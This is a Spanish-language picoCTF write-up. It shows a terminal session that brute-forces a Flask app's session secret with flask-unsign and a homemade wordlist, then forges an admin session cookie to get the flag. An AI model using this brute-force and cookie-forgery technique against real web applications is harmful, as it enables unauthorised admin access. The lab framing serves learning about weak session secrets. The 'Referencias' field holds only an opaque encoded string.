## Descripción
```
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

Additional details will be available after launching your challenge instance.
```
## Solución
```
┌──(Armando_Porti㉿DESKTOP-28KM9FK)-[~]
└─$ cat > cookies.txt
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
┌──(Armando_Porti㉿DESKTOP-28KM9FK)-[~]
└─$ ls
cookies.txt  index.html  index.html.1  keys.txt  wordlist.txt
┌──(Armando_Porti㉿DESKTOP-28KM9FK)-[~]
└─$ cat cookies.txt
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
┌──(Armando_Porti㉿DESKTOP-28KM9FK)-[~]
└─$ flask-unsign --unsign --server "http://wily-courier.picoctf.net:62733/" --wordlist cookies.txt
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aa24-A.fSlj5BgsbYwE4eEIzKBQ7vGj9l0
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 27 attempts
'crinkle'

┌──(Armando_Porti㉿DESKTOP-28KM9FK)-[~]
└─$ flask-unsign -s -c "{'very_auth': 'admin'}" -S crinkle
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aa25Cw.fs0HBZ5rXY7OJnWxHVICQdxDoFU


flag: `picoCTF{cO0ki3s_yum_f3526545}`

```

## Notas 
```
La lista de las cookies.txt la tuve que hacer yo manualmente, me base un vídeo de youtube
```

## Referencias
````
EgZjaHJvbWUqEAgBEEUYExgnGDsYgAQYigUyBggAEEUYOTIQCAEQRRgTGCcYOxiABBiKBTIJCAIQABgTGIAEMgoIAxAAGBMYFhgeMgoIBBAAGBMYFhgeMgYIBRBFGDwyBggGEEUYPDIGCAcQRRg80gEIMTk5M2owajeoAgCwAgA
```
